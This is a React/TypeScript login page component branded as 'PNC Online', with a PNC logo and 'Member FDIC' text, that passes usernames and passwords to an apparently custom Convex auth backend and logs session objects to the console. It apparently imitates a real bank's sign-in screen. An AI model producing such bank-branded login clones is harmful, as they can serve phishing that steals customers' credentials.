import React, { useState } from 'react';
import { User, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
import { useAuth } from '../contexts/ConvexProvider';
import { useNavigate } from 'react-router-dom';

interface LoginProps {
  onLoginSuccess: () => void;
}

export const Login: React.FC<LoginProps> = ({ onLoginSuccess }) => {
  const navigate = useNavigate();
  const { login } = useAuth();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;

    setIsLoading(true);
    setError('');

    try {
      console.log('Attempting user login with:', { username, password: '***' });
      const { session, error } = await login(username, password);
      console.log('User login result:', { session, error });

      if (error || !session) {
        console.log('User login failed:', error?.message);
        setError(error?.message || 'Invalid username or password');
        setIsLoading(false);
        return;
      }

      console.log('User login successful, navigating to dashboard');
      onLoginSuccess();
      navigate('/'); // Redirect to dashboard on successful login
    } catch (error) {
      console.error('User login error:', error);
      setError('Login failed. Please try again.');
    }

    setIsLoading(false);
  };



  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-900 via-blue-800 to-[#1e3a8a] flex items-center justify-center p-6 relative overflow-hidden">
      {/* Enhanced Background Pattern */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -bottom-1/2 -left-1/4 w-96 h-96 bg-gradient-to-r from-blue-400/40 to-[#1e3a8a]/40 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute -top-1/2 -right-1/4 w-96 h-96 bg-gradient-to-r from-blue-300/40 to-blue-500/40 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute top-1/4 left-1/3 w-64 h-64 bg-gradient-to-r from-[#1e3a8a]/30 to-blue-400/30 rounded-full blur-2xl animate-bounce-subtle"></div>
        <div className="absolute bottom-1/3 right-1/4 w-48 h-48 bg-gradient-to-r from-blue-500/30 to-[#1e3a8a]/30 rounded-full blur-xl animate-pulse"></div>
      </div>

      <div className="relative w-full max-w-md animate-fade-in">
        {/* Enhanced Logo */}
        <div className="text-center mb-10">
          <div className="inline-flex items-center justify-center mb-8">
            <img src="/logo_pnc.png" alt="PNC Online Logo" className="h-24" />
          </div>
          <p className="text-blue-100 text-lg font-medium drop-shadow-lg">Secure access to your financial future</p>
        </div>



        {/* Enhanced Login Form */}
        <div className="bg-gradient-to-br from-blue-800/70 to-[#1e3a8a]/70 backdrop-blur-xl rounded-3xl p-8 shadow-2xl border border-blue-400/30 animate-slide-up">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Error Message */}
            {error && (
              <div className="bg-gradient-to-r from-red-600/80 to-red-700/80 border border-red-400/50 rounded-2xl p-4 text-white text-sm font-medium animate-scale-in backdrop-blur-sm">
                <div className="flex items-center space-x-2">
                  <span className="text-red-200">⚠️</span>
                  <span>{error}</span>
                </div>
              </div>
            )}

            {/* Username Field */}
            <div>
              <div className="relative">
                <User className="absolute left-4 top-1/2 transform -translate-y-1/2 text-blue-200" size={22} />
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Username"
                  className="w-full bg-gradient-to-r from-[#1e3a8a]/60 to-blue-800/60 border-2 border-blue-400/40 rounded-2xl px-14 py-4 text-white placeholder-blue-200 focus:bg-blue-800/70 focus:border-blue-300/60 focus:outline-none transition-all-smooth font-medium backdrop-blur-sm"
                  required
                />
              </div>
            </div>

            {/* Password Field */}
            <div>
              <div className="relative">
                <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-blue-200" size={22} />
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  className="w-full bg-gradient-to-r from-[#1e3a8a]/60 to-blue-800/60 border-2 border-blue-400/40 rounded-2xl px-14 py-4 pr-16 text-white placeholder-blue-200 focus:bg-blue-800/70 focus:border-blue-300/60 focus:outline-none transition-all-smooth font-medium backdrop-blur-sm"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-blue-200 hover:text-white transition-colors p-1 rounded-lg hover:bg-blue-700/50"
                >
                  {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
                </button>
              </div>
            </div>

            {/* Save Username */}
            <div className="flex items-center space-x-3">
              <button
                type="button"
                onClick={() => setSaveUsername(!saveUsername)}
                className={`w-6 h-6 rounded-full border-2 border-blue-300/60 flex items-center justify-center transition-all-smooth ${
                  saveUsername ? 'bg-gradient-to-r from-blue-400 to-blue-500 border-blue-400' : 'hover:border-blue-200'
                }`}
              >
                {saveUsername && <div className="w-3 h-3 bg-white rounded-full"></div>}
              </button>
              <span className="text-blue-100 text-sm font-medium">Save Username</span>
            </div>

            {/* Login Button */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-4 rounded-2xl focus:outline-none focus:ring-4 focus:ring-blue-300/50 transition-all-smooth disabled:opacity-50 disabled:cursor-not-allowed transform hover:scale-105 text-lg shadow-xl"
            >
              {isLoading ? (
                <div className="flex items-center justify-center space-x-2">
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  <span>Signing In...</span>
                </div>
              ) : (
                'Log in'
              )}
            </button>
          </form>

          {/* Footer Links */}
          <div className="flex justify-between items-center mt-8 pt-6 border-t border-blue-400/30">
            <button className="text-blue-200 hover:text-white text-sm font-medium transition-colors hover:bg-blue-700/50 px-3 py-2 rounded-xl">
              Forgot Password?
            </button>
            <button className="text-blue-200 hover:text-white text-sm font-bold transition-colors hover:bg-blue-700/50 px-3 py-2 rounded-xl">
              ENROLL
            </button>
          </div>
        </div>

        {/* Legal Text */}
        <div className="text-center mt-8 space-y-2">
          <p className="text-blue-200 text-sm font-medium drop-shadow-lg">© 2024 PNC Online </p>
          <p className="text-blue-300 text-xs drop-shadow-lg">
            Member FDIC. All Rights Reserved.
          </p>
        </div>
      </div>
    </div>
  );
};